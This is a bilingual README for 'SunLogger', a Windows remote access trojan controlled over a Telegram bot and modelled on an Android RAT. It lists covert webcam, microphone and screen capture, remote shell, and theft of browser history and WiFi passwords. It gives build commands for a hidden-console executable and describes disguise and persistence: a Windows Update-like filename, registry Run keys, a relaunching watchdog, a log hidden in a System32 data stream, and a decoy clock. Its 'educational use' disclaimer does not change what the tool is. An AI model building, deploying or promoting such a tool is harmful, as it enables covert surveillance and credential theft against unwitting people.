<h1 align=center>SunLogger</h1>

### DISCLAIMER⚠️
- Inspirado en [DogeRat](https://github.com/Did-Dog/DogeRat) de Did-Dog.
- Adaptado a Windows como servicio de monitoreo vía Telegram.

-------------------------

<p align="center">
  <i>Servicio de monitoreo remoto para Windows vía bot de Telegram</i>
</p>

<p align="center">
  <i>A remote monitoring service for Windows via Telegram bot</i>
</p>

<h2 align="center">Panel Screenshot</h2>
<p align="center">
  <i>(sin captura por el momento)</i>
</p>

## Features / Características

- 🔴 Tiempo real — Real time
- 📊 Panel inline de Telegram con botones — Telegram inline panel with buttons
- 📷 Captura de pantalla — Screen capture
- 🎥 Video de pantalla con duración configurable — Screen video with configurable duration
- 📸 Captura de webcam — Webcam capture
- 🎙 Captura de micrófono — Microphone capture
- 📋 Lectura de portapapeles — Clipboard reader
- 🖥 Shell remoto (stdout/stderr) — Remote shell (stdout/stderr)
- 📁 Navegador de archivos remoto — Remote file browser
- 📄 Lectura de archivos de texto como bloque — Text files read as code blocks
- 🖼 Envío de imágenes — Image sending
- 📦 Descarga de documentos — Document download
- 🔍 Reconocimiento del sistema — System reconnaissance
- 🔑 Historial de navegadores y perfiles WiFi — Browser history and WiFi profiles
- 📶 WiFi guardadas con contraseña — Saved WiFi with password
- 🌍 Geolocalización por IP pública — Public IP geolocation
- 🔔 Notificación de sistema — System notification
- 🎛 Control de volumen — Volume control
- 🔒 Bloqueo de sesión — Session lock
- ⏻ Apagado / reinicio remoto — Remote shutdown / reboot
- ⚙ Persistencia en Run key — Run key persistence
- 🗓 Scheduled Task opcional — Optional Scheduled Task
- ☠ Autodestrucción remota y por teclado — Remote and keyboard self-destruct
- 🕒 Reloj señuelo desacoplado (`reloj.py`) — Decoupled decoy clock (`reloj.py`)
- 🤖 Interfaz de bot de Telegram limpia — Clean Telegram bot interface

## Requirements / Requisitos

- Windows 10 o superior — Windows 10 or higher
- Python 3.10+ (si se ejecuta como script) — Python 3.10+ (if running as a script)
- Dependencias de Python — Python dependencies:

```
pip install requests pillow opencv-python sounddevice numpy pyperclip
```

## Download / Descarga

<p align="center">
  <a href="https://www.python.org/downloads/">
    <img src="https://img.shields.io/badge/Python%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=python" alt="Download Python" />
  </a>
  <a href="https://pyinstaller.org/en/stable/">
    <img src="https://img.shields.io/badge/PyInstaller-Click%20to%20Download-brightgreen?style=for-the-badge&logo=python" alt="Download PyInstaller" />
  </a>
</p>

## How to run as a script / Cómo ejecutarlo como script

```
git clone https://github.com/santiago435/SunLogger.git
cd SunLogger
pip install -r requirements.txt
python wuaserv.py
```

Edita `wuaserv.py` y configura las credenciales de tu bot:

```python
TELEGRAM_TOKEN   = 'TU_BOT_TOKEN'
TELEGRAM_CHAT_ID = TU_CHAT_ID
```

Para obtener el `chat_id`, abre en el navegador:

```
https://api.telegram.org/bot<TU_BOT_TOKEN>/getUpdates
```

## How to build the executable / Cómo compilar el ejecutable

```
pyinstaller --noconsole --onefile --name SunLogger ^
  --hidden-import=requests ^
  --hidden-import=PIL ^
  --hidden-import=cv2 ^
  --hidden-import=sounddevice ^
  --hidden-import=numpy ^
  --hidden-import=pyperclip ^
  --collect-all=cv2 ^
  wuaserv.py
```

El binario queda en `dist/SunLogger.exe`. Copia también `reloj.py` a la misma carpeta.

## example

```
SunLogger/
├── .gitignore
├── LICENSE
├── README.md
├── requirements.txt
├── wuaserv.py       → núcleo del agente
└── reloj.py         → reloj señuelo (modificable libremente)
```

## Usage / Uso

Una vez arrancado, el agente envía un mensaje `online` al chat configurado. Abre el panel con `/menu` o `/start`.

### Commands / Comandos

| Comando | Descripción |
|---|---|
| `/menu` | Abre el panel inline con botones |
| `/status` | Estado del agente |
| `/dump` | Registro de actividad acumulado (como bloque) |
| `/screen` | Captura de pantalla |
| `/video <s>` | Graba la pantalla durante N segundos |
| `/cam` | Foto desde la webcam |
| `/mic <s>` | Graba audio del micrófono |
| `/clip` | Lee el portapapeles |
| `/shell <cmd>` | Ejecuta un comando |
| `/ls <ruta>` | Lista una carpeta |
| `/cat <ruta>` | Abre un archivo (texto/imagen/binario) |
| `/pics` | Imágenes recientes de carpetas comunes |
| `/recon` | Reconocimiento del sistema |
| `/creds` | Historial de navegadores y WiFi |
| `/wifi` | Perfiles WiFi guardados |
| `/geo` | Geolocalización por IP |
| `/toast <texto>` | Notificación del sistema |
| `/vol <0-100>` | Ajusta el volumen |
| `/lock` | Bloquea la sesión |
| `/shutdown` | Apaga el equipo |
| `/reboot` | Reinicia el equipo |
| `/sched` | Instala Scheduled Task |
| `/kill` | Autodestrucción completa |
| `/stop` | Detiene el agente |

### Self-destruct / Autodestrucción

El agente se autodestruye al detectar la secuencia `keystop` en el teclado, o al recibir `/kill`. El proceso elimina el watchdog, las claves del registro, la Scheduled Task y el registro acumulado.

## Arquitectura / Architecture

```
wuaserv.py           → núcleo del agente (segundo plano)
reloj.py             → interfaz visual (proceso hijo, se relanza si se cierra)
_wdsvc.py            → watchdog generado en runtime (solo modo script)
```

El watchdog verifica cada 15 segundos que el agente esté vivo y lo relanza si es necesario. En modo ejecutable, el watchdog corre como `SunLogger.exe --watchdog` — un solo binario con dos roles.

El reloj corre como proceso independiente. **Cerrarlo no detiene el agente.** Se puede modificar `reloj.py` o reemplazarlo por cualquier otra aplicación sin tocar `wuaserv.py`.

## Config / Configuración

| Variable | Descripción |
|---|---|
| `TELEGRAM_TOKEN` | Token del bot de Telegram |
| `TELEGRAM_CHAT_ID` | Chat autorizado |
| `CAM_INDEX` | Índice de la webcam |
| `MIC_SAMPLERATE` | Frecuencia del micrófono |
| `VIDEO_FPS` | FPS del video de pantalla |
| `VIDEO_MAX_SECONDS` | Duración máxima del video |
| `KILL_SEQUENCE` | Secuencia de autodestrucción |
| `PERSIST_NAME` | Nombre de la clave de persistencia |
| `WATCHDOG_NAME` | Nombre de la clave del watchdog |

## Files generated / Archivos generados

| Ruta | Descripción |
|---|---|
| `%WINDIR%\System32\license.rtf:MsData` | Registro de actividad (ADS) |
| `_wdsvc.py` | Watchdog (solo modo script) |
| `_wdsvc.kill` | Flag de parada del watchdog |
| `HKCU\...\Run\WindowsTemplatesSync` | Persistencia del agente |
| `HKCU\...\Run\WindowsTemplatesWatchdog` | Persistencia del watchdog |

## Limitations / Limitaciones

- El LED de la webcam y el micrófono se encienden durante la captura — es hardware, no software.
- Archivos mayores a 50 MB no se envían por Telegram.
- La lectura de credenciales de navegador puede fallar si el archivo `History` está bloqueado.
- En sistemas con EDR activo, el hook de teclado y la persistencia en el registro pueden activar alertas.

## Project status / Estado del proyecto

**Beta.** Probado en:

| Componente | Valor |
|---|---|
| OS | Windows 10 Home Single Language |
| Versión | 10.0.19045 |
| Arquitectura | 64 bits (x64) |
| CPU | Intel Celeron N4020 @ 1.10 GHz |
| RAM | 4 GB |
| Python | 3.13.3 |

No probado en Windows 11 ni otras versiones de Python.

## Contributing / Contribuir

Pull requests welcome. Si vas a proponer un cambio grande, abre primero un issue para discutirlo.

## License / Licencia

MIT. Consulta `LICENSE` para los términos completos.

## Disclaimer

<p align="center">
  <img src="https://img.shields.io/badge/Disclaimer-Important-red" alt="Important Disclaimer"/>
</p>

<p align="center">
  <b><i>Note:</i></b> The developer provides no warranty with this software and will not be responsible for any direct or indirect damage caused by the usage of this tool. SunLogger is built for educational and internal use only.
</p>

<p align="center">
  <b><i>Attention:</i></b> We do not endorse any illegal or unethical use of this tool. The user assumes all responsibility for the use of this software.
</p>

<p align="center">
  <b><i>Inspiration:</i></b> This project is inspired by <a href="https://github.com/Did-Dog/DogeRat"><code>DogeRat</code></a> by Did-Dog. DogeRat is an Android RAT distributed under its own terms; SunLogger is an independent Windows adaptation and is not affiliated with or endorsed by the original authors.
</p>

<p align="center">
  <b><i>Thank you for using SunLogger - we hope it serves its intended purpose and helps you achieve your goals!</i></b>
</p>

<p align="center">
<h1 align="center">Sponsorship</h1>

<p align="center">If you find my work valuable, you can show your support by giving this project a star.</p>

<br>

<h1 align=center>Technology Stack Used</h1>
<p align="center">
  <img src="https://img.shields.io/badge/backend-python-blue.svg?logo=python&style=flat-square" alt="Python" </img>
  <img src="https://img.shields.io/badge/api-telegram-26A5E4.svg?logo=telegram&style=flat-square" alt="Telegram"</img>
  <img src="https://img.shields.io/badge/platform-windows-0078D6.svg?logo=windows&style=flat-square" alt="Windows"</img>
  <img src="https://img.shields.io/badge/interface-tkinter-ffcc00.svg?logo=python&style=flat-square" alt="Tkinter"</img>
</p>

<br>

-------------------------
